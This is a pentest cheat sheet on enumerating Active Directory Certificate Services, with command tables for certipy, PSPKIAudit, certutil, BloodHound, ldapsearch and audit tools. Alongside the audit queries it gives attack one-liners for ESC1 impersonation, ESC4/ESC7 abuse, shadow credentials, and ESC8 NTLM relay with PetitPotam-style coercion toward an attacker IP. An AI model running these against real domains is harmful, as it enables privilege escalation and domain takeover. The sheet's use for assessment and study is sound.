---
aliases:
  - ADCS Tooling
  - certipy
  - PSPKIAudit
  - Locksmith
tags:
  - type/tool
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[AD - ADCS Enumeration]]'
  - '[[netexec]]'
---
# AD - ADCS Enumeration - Tooling

***

## certipy (Linux)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `certipy find -u u@corp.local -p pass -dc-ip <DC>` | CAs + templates auto | Standard. |
| `certipy find -u u@corp.local -p pass -dc-ip <DC> -vulnerable -stdout` | Solo vulnerables | Quick. |
| `certipy find -u u -p pass -dc-ip <DC> -text -output corp` | Output text + JSON | Audit. |
| `certipy req -u u -p pass -ca <CA> -template <T>` | Request cert | Standard enroll. |
| `certipy req -u u -p pass -ca <CA> -template <T> -upn 'admin@corp.local'` | ESC1 exploit | SAN injection. |
| `certipy auth -pfx <cert>.pfx -dc-ip <DC>` | PKINIT auth | Cert → TGT/hash. |
| `certipy shadow auto -u u -p pass -account victim -dc-ip <DC>` | Shadow Cred | Privesc. |
| `certipy ca -u u -p pass -ca <CA> -issue-request <id>` | ESC7 approve | Privesc. |
| `certipy template -u u -p pass -dc-ip <DC> -template <T> -save-old` | ESC4 modify template | Privesc + cleanup. |
| `certipy relay -target http://<CA>/certsrv/certfnsh.asp -ca <CA> -template DomainController` | ESC8 built-in relay | All-in-one. |
^ad-adcstool-certipy

___

## PSPKIAudit (Windows)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Import-Module PSPKIAudit` | Carga módulo | Pre-cmdlet. |
| `Invoke-PKIAudit` | Audit comprehensive | Standard. |
| `Get-CertificationAuthority` (PSPKI) | CAs Enterprise | Inventory. |
| `Get-CertificateTemplate` (PSPKI) | Templates | Inventory. |
| `Get-CertificateTemplateAcl` (PSPKI) | DACL templates | ACL audit. |
| `Get-AuditCertificateTemplate -Vulnerable` | Templates vulnerables | Hunt. |
^ad-adcstool-pspki

```powershell
git clone https://github.com/GhostPack/PSPKIAudit
Import-Module .\PSPKIAudit\PSPKIAudit.psd1
Invoke-PKIAudit | Format-Table
```

___

## RSAT / Native Windows

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `certutil -dsTemplate` | Templates raw | Sin RSAT-AD CS. |
| `certutil -CAInfo` | CA flags (incluye EDITF) | ESC6 check. |
| `certutil -viewstore -enterprise NTAuth` | NTAuth Store | Audit. |
| `certutil -ping -config <CA-name>` | CA reachability | Pre-attack. |
| `Get-CertificationAuthority` (PSPKI con RSAT-AD CS) | CAs | Standard. |
| `Get-CertificateTemplate` (PSPKI) | Templates | Standard. |
^ad-adcstool-native

___

## BloodHound ADCS

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (t:CertTemplate {enrolleeSuppliesSubject:true,hasAuthenticationEKU:true}) RETURN t` | ESC1 templates | Standard. |
| `MATCH (u)-[:Enroll]->(t:CertTemplate) RETURN u,t` | Enroll edges | Standard. |
| `MATCH (u)-[:ManageCA\|ManageCertificates]->(c:EnterpriseCA) RETURN u,c` | ESC7 surface | Critical. |
| `MATCH p=shortestPath((u {owned:true})-[*1..]->(t {highvalue:true})) WHERE any(n IN nodes(p) WHERE n:CertTemplate OR n:EnterpriseCA) RETURN p` | Privesc paths via ADCS | Path. |
| BHCE pre-built "ADCS" queries | GUI panel | Standard. |
^ad-adcstool-bh

```bash
# SharpHound captura ADCS edges con -c All (BHCE 4.x+)
.\SharpHound.exe -c All

# Linux
bloodhound-python -d corp.local -u u -p p -ns <DC> -c All --zip
```

___

## ldapsearch / Linux LDAP

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ldapsearch -h <DC> -D 'corp\u' -w pass -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" "(objectClass=pKIEnrollmentService)" cn dnsHostName certificateTemplates` | CAs raw | Linux. |
| `ldapsearch ... -b "CN=Certificate Templates,CN=Public Key Services,..." "(objectClass=pKICertificateTemplate)" cn pkiExtendedKeyUsage msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag` | Templates raw | Linux. |
| `ldapsearch ... -b "CN=NTAuthCertificates,..." -s base "(objectClass=*)" cACertificate` | NTAuth raw | Linux. |
^ad-adcstool-ldapsearch

___

## ADRecon / Bulk Reports

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `.\ADRecon.ps1 -DomainController <DC> -OutputType Excel` | Excel multi-sheet (incluye sheets PKI) | Auditor. |
| `ADRecon-ADCS` (extension) | ADCS-specific report | Targeted. |
| `Invoke-Locksmith` | ADCS audit PowerShell native | Quarterly. |
^ad-adcstool-bulk

```powershell
# Locksmith (ADCS audit comprehensive)
Install-Module Locksmith
Invoke-Locksmith -Mode 1
# Output: ADCS misconfigs + remediation suggestions
```

___

## NTLM Relay Tools (ESC8)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController` | Standard NTLM Relay | ESC8. |
| `certipy relay -target http://<CA>/certsrv/certfnsh.asp -ca <CA> -template DomainController` | Built-in certipy relay | All-in-one. |
| `PetitPotam.py -u u -p pass <attacker-IP> <victim>` | Coercion source | NTLM trigger. |
| `dfscoerce.py -u u -p pass <attacker-IP> <victim>` | Alt coercion | Si PetitPotam patched. |
| `Coercer.py coerce -t <victim> -l <attacker-IP> -u u -p pass -d corp.local` | Multi-method | Comprehensive. |
^ad-adcstool-relay

___

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| certipy | `https://github.com/ly4k/Certipy` |
| Certify (Windows) | `https://github.com/GhostPack/Certify` |
| PSPKIAudit | `https://github.com/GhostPack/PSPKIAudit` |
| Locksmith | `https://github.com/TrimarcJake/Locksmith` |
| SpecterOps "Certified Pre-Owned" whitepaper | `https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf` |
| HackTricks ADCS | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates` |
| The Hacker Recipes — ADCS | `https://www.thehacker.recipes/ad/movement/adcs` |
| Microsoft KB5014754 (Certifried) | `https://support.microsoft.com/help/5014754` |
| Akamai ESC13/ESC14 research | `https://www.akamai.com/blog/security-research/active-directory-certificate-services-esc13` |
^ad-adcstool-resources

***
